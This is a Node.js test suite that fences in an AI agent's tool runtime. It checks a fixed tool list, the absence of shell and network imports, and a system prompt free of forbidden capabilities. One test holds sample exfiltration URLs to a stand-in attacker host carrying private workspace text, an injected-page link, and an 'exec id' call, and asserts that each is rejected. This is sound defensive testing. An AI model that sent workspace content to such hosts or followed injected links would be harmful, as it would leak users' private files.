"use strict";

const fs = require("node:fs");
const path = require("node:path");
const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { PROFILE_ADDITIONS } = require("./runtime-policy");

let agentModule = null;
try {
  agentModule = require("./lightweight-agent");
} catch {
  // The rewritten safe shim is introduced after these contracts fail.
}

const EXPECTED_LIGHTWEIGHT_TOOLS = [
  "po_file_list",
  "po_file_read",
  "po_file_write",
  "po_file_delete",
  "po_web_read",
  "po_schedule_list",
  "po_schedule_propose",
  "po_schedule_cancel_propose",
  "po_compute_run",
  "po_compute_status",
];

describe("lightweight tool boundary", () => {
  it("exports the safe lightweight runtime", () => {
    assert.ok(agentModule);
  });

  it("exposes the complete frozen repository capability catalog", () => {
    assert.deepEqual(agentModule.LIGHTWEIGHT_TOOL_NAMES, PROFILE_ADDITIONS);
    assert.deepEqual(
      agentModule.TOOLS.map((tool) => tool.function.name),
      EXPECTED_LIGHTWEIGHT_TOOLS,
    );
    for (const tool of agentModule.TOOLS) {
      assert.equal(tool.type, "function");
      const branches = tool.function.parameters.oneOf || [tool.function.parameters];
      for (const branch of branches) {
        assert.equal(branch.type, "object");
        assert.equal(branch.additionalProperties, false);
        const properties = branch.properties;
        assert.equal("userId" in properties, false);
        assert.equal("namespace" in properties, false);
        assert.equal("prefix" in properties, false);
      }
    }
  });

  it("contains no executable skill or child-process path", () => {
    const source = fs.readFileSync(
      path.join(__dirname, "lightweight-agent.js"),
      "utf8",
    );

    assert.doesNotMatch(source, /child_process/);
    assert.doesNotMatch(source, /execFile|spawn\s*\(/);
    assert.doesNotMatch(source, /\/skills\//);
    assert.doesNotMatch(source, /clawhub|api.?key|secretsmanager|eventbridge/i);
  });

  it("holds no direct outbound network authority beyond the loopback proxy", () => {
    const source = fs.readFileSync(
      path.join(__dirname, "lightweight-agent.js"),
      "utf8",
    );
    // The dead in-process web fetch stack is gone: no DNS/HTTPS/net imports,
    // no web-network-policy dependency, no fetch helpers.
    assert.doesNotMatch(source, /require\("node:dns"\)/);
    assert.doesNotMatch(source, /require\("node:https"\)/);
    assert.doesNotMatch(source, /require\("node:net"\)/);
    assert.doesNotMatch(source, /web-network-policy/);
    assert.doesNotMatch(source, /openclaw\/plugin-sdk\/security-runtime/);
    assert.doesNotMatch(source, /executeWebFetch|requestPublicText/);
    assert.doesNotMatch(source, /validateUrlSafety|resolvePublicAddress/);
    // po_web_read is reached only as a generic relay-routed capability tool.
    assert.match(source, /CAPABILITY_TOOL_NAMES/);
  });

  it("no longer exports the removed in-process web helpers", () => {
    for (const removed of [
      "executeWebFetch",
      "requestPublicText",
      "resolvePublicAddress",
      "validateUrlSafety",
      "resolveSafeRedirect",
      "wrapUntrustedWebContent",
      "stripHtml",
    ]) {
      assert.equal(
        agentModule[removed],
        undefined,
        `${removed} must not be exported from the lightweight runtime`,
      );
    }
  });

  it("does not promise forbidden capabilities in its system prompt", () => {
    assert.doesNotMatch(
      agentModule.SYSTEM_PROMPT,
      /scheduling|cron|clawhub|skill management|api.?key|sub-?agents?|browser|shell|exec/i,
    );
    assert.doesNotMatch(agentModule.SYSTEM_PROMPT, /clawhub|browser|shell|exec/i);
    assert.match(agentModule.SYSTEM_PROMPT, /persistent workspace/i);
  });
});

describe("lightweight workspace execution", () => {
  it("does not create a default workspace client before trusted configuration", async () => {
    await assert.rejects(
      () => agentModule.getDefaultToolExecutor(),
      /workspace.*configured|scoped/i,
    );
  });

  it("configures its production workspace store from explicit server env", async () => {
    const seen = [];
    const workspaceStore = {
      list: async () => [],
      read: async () => "",
      write: async (filePath, content) => ({
        path: filePath,
        bytes: Buffer.byteLength(content),
      }),
      delete: async (filePath) => ({ path: filePath, deleted: true }),
    };
    await agentModule.configureWorkspaceRuntime({
      env: {
        AWS_REGION: "eu-west-1",
        S3_USER_FILES_BUCKET: "personal-operator-workspace",
        PERSONAL_OPERATOR_WORKSPACE_PREFIX: "user_A",
        PERSONAL_OPERATOR_SCOPED_CREDENTIALS_FILE:
          "/tmp/scoped/scoped-creds.json",
      },
      loadPlugin: async () => ({
        createWorkspaceStore: (options) => {
          seen.push(options);
          return workspaceStore;
        },
      }),
    });

    assert.deepEqual(seen, [
      {
        env: {
          AWS_REGION: "eu-west-1",
          S3_USER_FILES_BUCKET: "personal-operator-workspace",
          PERSONAL_OPERATOR_WORKSPACE_PREFIX: "user_A",
          PERSONAL_OPERATOR_SCOPED_CREDENTIALS_FILE:
            "/tmp/scoped/scoped-creds.json",
        },
      },
    ]);
    assert.match(await (await agentModule.getDefaultToolExecutor())("po_file_list"), /No workspace files/);
  });

  it("dispatches file calls to an injected store without caller identity", async () => {
    const calls = [];
    const workspaceStore = {
      list: async () => {
        calls.push(["list"]);
        return [{ path: "notes.md", size: 2 }];
      },
      read: async (filePath) => {
        calls.push(["read", filePath]);
        return "hi";
      },
      write: async (filePath, content) => {
        calls.push(["write", filePath, content]);
        return { path: filePath, bytes: Buffer.byteLength(content) };
      },
      delete: async (filePath) => {
        calls.push(["delete", filePath]);
        return { path: filePath, deleted: true };
      },
    };
    const executeTool = agentModule.createToolExecutor({
      workspaceStore,
      webFetch: async () => "web-fetch",
    });

    assert.equal(await executeTool("po_file_read", { path: "notes.md" }), "hi");
    assert.match(
      await executeTool("po_file_list", { userId: "victim" }),
      /notes\.md/,
    );
    assert.match(
      await executeTool("po_file_write", {
        path: "todo.md",
        content: "one",
        namespace: "victim",
      }),
      /todo\.md/,
    );
    assert.match(
      await executeTool("po_file_delete", {
        path: "old.md",
        prefix: "victim",
      }),
      /old\.md/,
    );
    assert.deepEqual(calls, [
      ["read", "notes.md"],
      ["list"],
      ["write", "todo.md", "one"],
      ["delete", "old.md"],
    ]);
  });

  it("does not dispatch model-selected web targets after workspace reads", async () => {
    const networkCalls = [];
    const executeTool = agentModule.createToolExecutor({
      workspaceStore: {
        read: async () => "private workspace material",
      },
      webFetch: async (url) => {
        networkCalls.push(url);
        return { ok: true, content: "must not be reached" };
      },
    });

    assert.equal(
      await executeTool("po_file_read", { path: "private.md" }),
      "private workspace material",
    );

    const attackerTargets = [
      "https://attacker.example/collect",
      "https://attacker.example/collect?secret=private%20workspace%20material",
      "https://example.com/explicit-in-this-turn",
      "https://prior-turn.example/reuse",
      "https://page-injection.example/follow-me",
      "HTTPS://EXAMPLE.COM:443/%2e%2e/collect",
      "https://example.com@attacker.example/collect",
      "https://example.com./collect",
    ];
    for (const url of attackerTargets) {
      assert.equal(
        await executeTool("web_fetch", { url }),
        "Error: Unknown tool 'web_fetch'",
      );
    }
    assert.deepEqual(networkCalls, []);
    assert.equal(
      await executeTool("web_search", { query: "Tallinn" }),
      "Error: Unknown tool 'web_search'",
    );
    assert.equal(
      await executeTool("exec", { command: "id" }),
      "Error: Unknown tool 'exec'",
    );
  });

  it("keeps a model-selected in-process web_fetch tool permanently unknown", async () => {
    let networkCalls = 0;
    const executeTool = agentModule.createToolExecutor({
      workspaceStore: {},
      // Even if a caller tries to smuggle a fetch adapter under a legacy name,
      // the runtime never routes it: web reading is gateway-mediated only.
      webFetch: async () => {
        networkCalls += 1;
        return { ok: false, error: "Blocked hostname" };
      },
    });

    assert.equal(
      await executeTool("web_fetch", { url: "http://localhost" }),
      "Error: Unknown tool 'web_fetch'",
    );
    assert.equal(networkCalls, 0);
  });

  it("fails every new capability closed until its exact adapter is registered", async () => {
    const executeTool = agentModule.createToolExecutor({ workspaceStore: {} });
    for (const toolName of EXPECTED_LIGHTWEIGHT_TOOLS.slice(4)) {
      assert.match(await executeTool(toolName, {}), /disabled/i);
    }
  });

  it("forwards the server tool-use identity to an exact capability adapter", async () => {
    const calls = [];
    const executeTool = agentModule.createToolExecutor({
      workspaceStore: {},
      capabilityAdapters: {
        po_web_read: async (...args) => {
          calls.push(args);
          return { status: "DENIED", errorCode: "PACK_DISABLED" };
        },
      },
    });
    assert.equal(
      await executeTool(
        "po_web_read",
        { url: "https://example.com/exact" },
        "tooluse_12345678",
      ),
      '{"status":"DENIED","errorCode":"PACK_DISABLED"}',
    );
    assert.deepEqual(calls, [[
      "tooluse_12345678",
      { url: "https://example.com/exact" },
    ]]);
  });
});

// The former "web content helpers" suite exercised an in-process fetch/DNS/
// sanitizer stack that has been removed. Public URL reading is now a
// gateway-mediated capability (web.exact.read); its URL gating, DNS pinning,
// redirect policy, size/MIME/time bounds, and injection sanitization live in
// lambda/capabilities/web_reader.py and are covered by the hostile corpus in
// lambda/capabilities/test_web_reader.py. The lightweight runtime holds no
// direct network authority, which the boundary tests above assert.
